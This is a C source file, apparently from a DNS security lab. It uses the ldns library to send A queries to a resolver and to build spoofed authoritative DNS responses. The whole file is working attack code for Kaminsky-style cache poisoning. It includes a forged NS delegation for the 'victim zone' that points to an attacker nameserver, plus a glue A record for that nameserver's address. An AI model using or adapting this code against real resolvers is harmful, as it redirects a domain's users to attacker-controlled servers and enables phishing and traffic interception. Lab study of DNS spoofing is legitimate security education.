/*
 * spoof_dns.c
 *
 * Implementation of the client-side DNS message construction, built on ldns.
 */

#include "spoof_dns.h"
#include "net_util.h"
#include "lab_config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ldns/ldns.h>

#define DNS_RR_MAX_TXT_LEN 256U

void send_a_query_to_resolver(const char *qname)
{
    if (qname == NULL) {
        return;
    }

    ldns_pkt *query_pkt = ldns_pkt_query_new(
        ldns_dname_new_frm_str(qname),
        LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (query_pkt == NULL) {
        return;
    }

    uint8_t *wire_buf = NULL;
    size_t wire_size = 0U;
    if (ldns_pkt2wire(&wire_buf, query_pkt, &wire_size) != LDNS_STATUS_OK ||
        wire_buf == NULL) {
        ldns_pkt_free(query_pkt);
        return;
    }

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        free(wire_buf);
        ldns_pkt_free(query_pkt);
        return;
    }

    struct sockaddr_in resolver_addr;
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    resolver_addr.sin_port = htons(DNS_PORT);

    if (ipv4_from_string(RESOLVER_IP_STRING, &resolver_addr.sin_addr)) {
        (void)sendto(sockfd, wire_buf, wire_size, 0,
                     (const struct sockaddr *)&resolver_addr,
                     (socklen_t)sizeof(resolver_addr));
    }

    (void)close(sockfd);
    free(wire_buf);
    ldns_pkt_free(query_pkt);
}

/* Create an RR from its textual representation, or NULL on failure. */
static ldns_rr *rr_from_str(const char *rr_str)
{
    ldns_rr *rr = NULL;
    if (ldns_rr_new_frm_str(&rr, rr_str, 0, NULL, NULL) != LDNS_STATUS_OK) {
        if (rr != NULL) {
            ldns_rr_free(rr);
        }
        return NULL;
    }
    return rr;
}

bool build_spoofed_response(const char *subdomain_name,
                            uint8_t **out_buf, size_t *out_len)
{
    if (subdomain_name == NULL || out_buf == NULL || out_len == NULL) {
        return false;
    }
    *out_buf = NULL;
    *out_len = 0U;

    ldns_pkt *resp = ldns_pkt_new();
    if (resp == NULL) {
        return false;
    }

    ldns_pkt_set_id(resp, 0U);
    ldns_pkt_set_qr(resp, true);   /* response      */
    ldns_pkt_set_aa(resp, true);   /* authoritative */
    ldns_pkt_set_rd(resp, false);
    ldns_pkt_set_ra(resp, false);
    ldns_pkt_set_rcode(resp, LDNS_RCODE_NOERROR);

    /* QUESTION section. */
    ldns_rdf *qname = ldns_dname_new_frm_str(subdomain_name);
    if (qname == NULL) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_rr *question_rr = ldns_rr_new();
    if (question_rr == NULL) {
        ldns_rdf_deep_free(qname);
        ldns_pkt_free(resp);
        return false;
    }
    ldns_rr_set_owner(question_rr, qname);
    ldns_rr_set_type(question_rr, LDNS_RR_TYPE_A);
    ldns_rr_set_class(question_rr, LDNS_RR_CLASS_IN);
    ldns_pkt_push_rr(resp, LDNS_SECTION_QUESTION, question_rr);

    char rr_str[DNS_RR_MAX_TXT_LEN];
    int n;

    /* ANSWER: throwaway A record for the queried subdomain. */
    n = snprintf(rr_str, sizeof(rr_str), "%s. 500 IN A 1.2.3.4", subdomain_name);
    if (n <= 0 || (size_t)n >= sizeof(rr_str)) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_rr *answer_rr = rr_from_str(rr_str);
    if (answer_rr == NULL) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_pkt_push_rr(resp, LDNS_SECTION_ANSWER, answer_rr);

    /* AUTHORITY: forged NS delegation for the victim zone. */
    n = snprintf(rr_str, sizeof(rr_str), "%s. 500 IN NS %s.",
                 TARGET_BASE_DOMAIN, ATTACKER_NS_FQDN);
    if (n <= 0 || (size_t)n >= sizeof(rr_str)) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_rr *ns_rr = rr_from_str(rr_str);
    if (ns_rr == NULL) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_pkt_push_rr(resp, LDNS_SECTION_AUTHORITY, ns_rr);

    /* ADDITIONAL: glue A record for the attacker NS hostname. */
    n = snprintf(rr_str, sizeof(rr_str), "%s. 500 IN A %s",
                 ATTACKER_NS_FQDN, ATTACKER_AUTH_IP_STRING);
    if (n <= 0 || (size_t)n >= sizeof(rr_str)) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_rr *glue_rr = rr_from_str(rr_str);
    if (glue_rr == NULL) {
        ldns_pkt_free(resp);
        return false;
    }
    ldns_pkt_push_rr(resp, LDNS_SECTION_ADDITIONAL, glue_rr);

    uint8_t *wire_buf = NULL;
    size_t wire_len = 0U;
    if (ldns_pkt2wire(&wire_buf, resp, &wire_len) != LDNS_STATUS_OK ||
        wire_buf == NULL) {
        free(wire_buf);
        ldns_pkt_free(resp);
        return false;
    }

    *out_buf = wire_buf;
    *out_len = wire_len;
    ldns_pkt_free(resp);
    return true;
}
